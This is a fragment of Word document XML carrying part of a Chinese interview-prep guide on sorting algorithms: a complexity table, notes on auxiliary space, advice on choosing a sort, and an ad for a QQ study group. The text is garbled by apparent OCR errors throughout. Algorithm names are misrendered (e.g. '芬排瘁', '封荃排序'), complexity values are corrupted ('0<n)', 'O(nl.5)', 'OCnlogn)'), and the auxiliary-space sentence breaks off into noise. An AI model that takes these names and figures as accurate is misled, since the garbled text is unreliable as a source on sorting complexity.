            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="255" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pP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平</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>W</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>况</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pP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700"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>最场情況</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="345" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>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E</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>芬排瘁</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(nlogn)</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Ofnlogn)</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700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(nlogn)</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基</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>g</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>字</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n)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0"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="B4A5B2"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>0&lt;n)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="345" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>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快遑排序</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>OCnlogn)</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O(nlogn)</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700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="315" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>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藉尔排字</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(nl.5)</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760"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="B4A5B2"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n)</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700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(nl.5)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="345" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>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插入排字</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>0(n2)</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760"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>0(n)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="255" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>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透择排序</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660"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>0(n2)</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0(n2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="700"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>O(n2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:after="419" w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="321" w:name="bookmark330"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="321"/>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、辅助空间的比较</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线形排序、二路归并排序的辅助空间为。（荷,其它排序的辅助空间为。（1）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="322" w:name="bookmark331"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="322"/>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、其它比较</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>插入、冒泡排序的速度较慢，但当参加排序的序列局部或整体有序时，这种排序能达到 较快的速度。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>反而在这种情况下，快速排序反而慢了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="323" w:name="bookmark332"/>
      <w:bookmarkEnd w:id="323"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>选择标准</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>较小时，对稳定性不作要求时宜用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>封荃排序，对稳定性有要求时宜用插入或冒泡排 序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>若待排序的记录的关键字在一个明显有限范围内时，且空间允许是用捅排序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>较大时，关键字元素比较随机，对稳定性没要求宜用快速排序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>较大时，关键字元素可能出现本身是有序的，对稳定性有要求时，空间允许的情况 下。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>宜用归并排序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>较大时，关键字元素可能出现本身是有序的，对稳定性没有要求时宜用堆排序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="520" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>更多、更全面试学习技术资料请加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>群：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>762073882</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="2"/>
          <w:szCs w:val="2"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="2714625" cy="809625"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="84" name="Picutre 84"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="84" name="Picutre 84"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId43"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2714625" cy="809625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="25"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3150"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>202碩阿里精选 202用百度精选</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>202碩腾汛精选</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="25"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
